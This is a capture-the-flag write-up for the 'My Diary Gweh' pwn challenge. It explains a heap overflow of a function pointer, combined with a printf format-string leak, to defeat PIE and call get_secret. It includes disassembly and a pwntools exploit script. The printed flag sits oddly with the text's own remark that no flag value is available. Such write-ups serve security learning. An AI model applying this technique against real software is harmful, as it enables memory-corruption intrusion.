## My Diary Gweh 

>## Description
>The program lets us create, view, edit, and delete diary entries. Each heap entry contains a 0x40-byte text field followed by a function pointer. The edit operation reads more bytes than the allocation holds, so we can overwrite that pointer. The normal printer also passes the entry text directly to `printf`, which lets us leak the pointer bytes beyond the text field. Use that leak to recover the PIE base, replace the callback with `get_secret`, and view the entry to print `flag.txt`.

---

>## Initial Analysis

We're given a 64-bit ELF binary named `chall`:

```
chall: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

The binary maintains a global array of ten entry pointers. Creating an entry allocates `0x48` bytes, stores user text in the first `0x40` bytes, and writes the address of `entry_printer` at offset `0x40`. Viewing an entry calls the function pointer at that offset. Editing uses `read(0, entry, 0x60)`, which accepts up to `0x60` bytes into the `0x48`-byte allocation and therefore reaches the callback.

### Protections

```bash
Arch:       amd64 (x86-64)
PIE:        Enabled
Canary:     Not present
NX:         Enabled
RELRO:      Full RELRO
Stripped:   No
```

Full RELRO makes GOT overwrites unavailable, but is not needed here: the vulnerable function pointer is stored in the heap allocation. NX is also not a blocker because the exploit reuses the existing `get_secret()` function.

Useful symbol offsets from this binary:

```bash
get_secret    0x1209
entry_printer 0x1294
write_entry   0x136c
read_entry    0x14d7
edit_entry    0x1587
main          0x1710
```

### Relevant disassembly

`write_entry()` allocates `0x48` bytes, initializes the callback at `entry + 0x40`, and reads at most `0x3f` characters plus a terminating NUL into the text area:

```asm
mov    edi, 0x48
call   malloc@plt
...
lea    rdx, [rip+...]        ; entry_printer
mov    QWORD PTR [rax+0x40], rdx
...
lea    rdi, [entry]
mov    esi, 0x40
call   fgets@plt
```

`entry_printer()` makes the text a format string instead of using `printf("%s", text)`. In this case we use a full-width 64-byte string to make `printf` continue into the callback bytes that follow it:

```asm
mov    rax, QWORD PTR [rbp-0x8]  ; entry pointer
mov    rdi, rax
call   printf@plt                ; printf(entry)
```

`read_entry()` loads and invokes the callback at offset `0x40`:

```asm
mov    rax, QWORD PTR [entry+0x40]
mov    rdi, entry
call   rax
```

Finally, `edit_entry()` performs the out-of-bounds write:

```asm
mov    rdx, 0x60
mov    rsi, entry
mov    edi, 0
call   read@plt
```

`get_secret()` opens `flag.txt`, reads it into a local buffer, prints it, closes the file, and exits.

>## Solution

Create entry 0 with a short string. Then edit it with exactly `0x40` non-NUL bytes. On the next view, `entry_printer()` calls `printf(entry)`. Since there is no NUL in the first 64 bytes, printing runs into the callback at offset `0x40`, leaking its little-endian address. The included exploit reads those bytes, pads them to eight bytes, and unpacks them as a 64-bit pointer.

The callback initially points to `entry_printer`, whose ELF-relative offset is `0x1294`. Therefore:

```text
PIE base = leaked entry_printer address - 0x1294
get_secret runtime address = PIE base + 0x1209
```

The edit operation accepts up to `0x60` bytes into a `0x48`-byte object. Place the new callback immediately after the 0x40-byte text region:

```python
payload = b"A" * 0x40 + p64(get_secret)
```

Viewing the entry then indirectly calls `get_secret(entry)`. Its extra argument is ignored, and the function prints the flag before exiting.

>### Exploit

The exploit is available in [`exploit.py`](exploit.py). Its core steps are:

```python
# Create entry 0, then fill all 0x40 text bytes without a NUL terminator.
write(0, b"A")
edit(0, b"A" * 0x40)
read(0)

# entry_printer prints the bytes at entry+0x40 after the 64 As.
p.recvuntil(b"A" * 0x40)
leak = p.recvline().strip()
leaked_ptr = u64(leak.ljust(8, b"\x00"))

pie_base = leaked_ptr - elf.symbols["entry_printer"]
get_secret = pie_base + elf.symbols["get_secret"]

# Replace the callback and trigger it.
edit(0, b"A" * 0x40 + p64(get_secret))
read(0)
p.interactive()
```

The script connects to `chall-ctf.ara-its.id:4141`. To run against a local copy, change the connection line to `process([elf.path])`.

>### Flag
```text
ARA{the_ch4ll3nge_1$_end3d}
```

The challenge server is no longer available, and no flag value is present in the local challenge files. Running the exploit requires a reachable service or a local `flag.txt` alongside the binary.
